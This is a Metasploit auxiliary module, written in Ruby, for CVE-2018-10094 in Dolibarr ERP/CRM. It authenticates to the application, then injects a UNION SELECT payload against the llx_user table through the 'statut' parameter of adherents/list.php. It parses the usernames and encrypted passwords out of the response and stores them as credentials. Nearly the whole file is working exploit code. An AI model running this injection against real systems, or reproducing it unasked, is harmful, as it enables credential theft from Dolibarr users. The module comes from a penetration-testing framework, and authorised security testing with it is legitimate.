##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Dolibarr Gather Credentials via SQL Injection',
      'Description'    => %q{
         This module enables an authenticated user to collect the usernames and
         encrypted passwords of other users in the Dolibarr ERP/CRM via SQL
         injection.
      },
      'Author'         => [
                            'Issam Rabhi',  # PoC
                            'Kevin Locati', # PoC
                            'Shelby Pace',  # Metasploit Module
                          ],
      'License'        => MSF_LICENSE,
      'References'     => [
                            [ 'CVE', '2018-10094' ],
                            [ 'EDB', '44805']
                          ],
      'DisclosureDate' => "May 30 2018"
    ))

    register_options(
      [
        OptString.new('TARGETURI', [ true, 'The base path to Dolibarr', '/' ]),
        OptString.new('USERNAME', [ true, 'The username for authenticating to Dolibarr', 'admin' ]),
        OptString.new('PASSWORD', [ true, 'The password for authenticating to Dolibarr', 'admin' ])
      ])
  end

  def check_availability
    login_page = target_uri.path.end_with?('index.php') ? normalize_uri(target_uri.path) : normalize_uri(target_uri.path, '/index.php')
    res = send_request_cgi(
      'method'  =>  'GET',
      'uri'     =>  normalize_uri(login_page)
    )

    return false unless res && res.body.include?('Dolibarr')

    return res
  end

  def login(response)
    return false unless response

    login_uri = target_uri.path.end_with?('index.php') ? normalize_uri(target_uri.path) : normalize_uri(target_uri.path, '/index.php')
    cookies = response.get_cookies
    print_status("Logging in...")

    login_res = send_request_cgi(
       'method'  =>  'POST',
       'uri'     =>  login_uri,
       'cookie'  =>  cookies,
       'vars_post' =>  {
         'username'  =>  datastore['USERNAME'],
         'password'  =>  datastore['PASSWORD'],
         'loginfunction' =>  'loginfunction'
       }
     )

    unless login_res && login_res.body.include?('id="mainmenua_members"')
      fail_with(Failure::NoAccess, "Couldn't log into Dolibarr")
    end

    print_good("Successfully logged into Dolibarr")
    return cookies
  end

  def get_info(cookies)
    inject_uri = target_uri.path.end_with?('index.php') ? target_uri.path.gsub('index.php', '') : target_uri.path
    inject_uri <<= "/adherents/list.php?leftmenu=members&statut="
    cmd = "1) union select 0,1,login,pass_crypted,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 from llx_user #"
    cmd = Rex::Text.uri_encode(cmd, 'hex-all')
    inject_uri <<= cmd

    inject_res = send_request_cgi(
      'method'  =>  'GET',
      'uri'     => normalize_uri(inject_uri),
      'cookie'  => cookies
    )

    unless inject_res && inject_res.body.include?('id="searchFormList"')
     fail_with(Failure::NotFound, "Failed to access page. The user may not have permissions.")
    end

    print_good("Accessed credentials")
    format_results(inject_res.body)
  end

  def format_results(output)
    credentials = output.scan(/valignmiddle">0<\/div><\/a><\/td>.<td>([a-zA-Z0-9]*)<\/td>.<td>(\S*)<\/td>/m)

    fail_with(Failure::NotFound, "No credentials found") if credentials.empty?

    credentials.each do |i, j|
      print_good("#{j} #{i}")
      store_valid_credential(user: j, private: i)
    end
  end

  def run
    available_res = check_availability
    fail_with(Failure::NotFound, "Could not access the Dolibarr webpage") unless available_res

    cookies = login(available_res)
    fail_with(Failure::NoAccess, "Could not log in. Verify credentials") unless cookies

    get_info(cookies)
  end
end
